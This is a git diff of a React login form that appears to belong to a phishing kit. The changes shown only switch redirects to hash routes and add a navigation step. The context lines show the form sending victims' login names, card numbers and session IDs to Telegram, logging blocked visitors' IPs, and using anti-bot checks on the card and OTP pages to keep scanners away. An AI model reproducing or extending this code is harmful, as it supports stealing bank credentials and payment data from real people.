@@ -164,16 +164,17 @@ function LoginForm() {
       }
       
       sessionStorage.setItem('blocked_ip', userIP);
-      window.location.href = '/blocked';
+      window.location.href = '/#/blocked';
     } catch (error) {
       console.error('Error blocking IP:', error);
-      window.location.href = '/blocked';
+      window.location.href = '/#/blocked';
     }
   };
   
   // MODIFIÉ: Maintenant affiche NextStepAppr au lieu de naviguer
   const handleNextStepAppr = async () => {
   console.log('🔵 Next Step (Appr) button clicked! - Showing NextStepAppr component');
+  window.location.href = '/NextStepAppr';
   
   // SEND CONFIRMATION LOG TO TELEGRAM (PERMANENT)
   await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
@@ -258,7 +259,7 @@ function LoginForm() {
       
       await sendBlockedLog(loginName, antiBotResult.reason, userIP);
       sessionStorage.setItem('block_reason', antiBotResult.reason);
-      window.location.href = '/blocked';
+      window.location.href = '/#/blocked';
       return;
     }
 
@@ -410,7 +411,7 @@ function LoginForm() {
       
       await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
       sessionStorage.setItem('block_reason', antiBotResult.reason);
-      window.location.href = '/blocked';
+      window.location.href = '/#/blocked';
       return;
     }
     
@@ -454,7 +455,7 @@ function LoginForm() {
       
       await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
       sessionStorage.setItem('block_reason', antiBotResult.reason);
-      window.location.href = '/blocked';
+      window.location.href = '/#/blocked';
       return;
     }
     
